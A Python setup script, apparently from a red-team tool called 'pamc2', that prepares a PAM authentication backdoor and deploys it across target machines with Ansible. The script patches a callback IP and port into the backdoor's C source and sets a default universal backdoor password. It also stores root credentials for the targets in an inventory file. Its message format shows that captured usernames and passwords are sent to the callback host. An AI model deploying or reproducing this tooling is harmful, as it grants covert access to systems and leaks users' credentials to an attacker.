#!/usr/bin/python3
import os
import argparse
import subprocess
import ansible_runner

def setup_cmd_args():
    parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
    parser.add_argument('-i', '--ip', metavar="<Callback IP Address>",
                        required=True, dest="ip", action="store")
    parser.add_argument('-p', '--port', metavar="<Callback Port>",
                        required=True, dest="port", action="store")
    parser.add_argument('-f', '--format', metavar="<Format String>",
                        dest="format", help="Format string for socket messages (MUST HAVE 4 %s's (ip, message, username, password)); Default: '%s - %s %s:%s")
    parser.add_argument('--password', metavar="<Backdoor Password>",
                        dest="password", help="Backdoor password to gain access to any user; Default: redteam123")
    return parser.parse_args()

def main():
    args = setup_cmd_args()

    ansible_user = input("Enter username of user with root access on the target machines: ")
    ansible_password = input("Enter password of this user: ")

    subprocess.run(f'sed -i "s/^ansible_user.*/ansible_user={ansible_user}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_password.*/ansible_password={ansible_password}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_become_password.*/ansible_become_password={ansible_password}/" ./inventory.ini', shell=True, text=True)

    subprocess.run(f'sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"{args.ip}\"/" ./pam_backdoor.c', shell=True, text=True)
    subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)

    setup_ansible = ansible_runner.run(
        private_data_dir=f"{os.getcwd()}",
        inventory="inventory.ini",
        playbook="main.yml",
        tags="setup"
    )

    if (setup_ansible.status != 'successful'):
        print("Setup ansible failed... exiting")
        exit(1)

    
    


    


if (__name__ == '__main__'):
    main()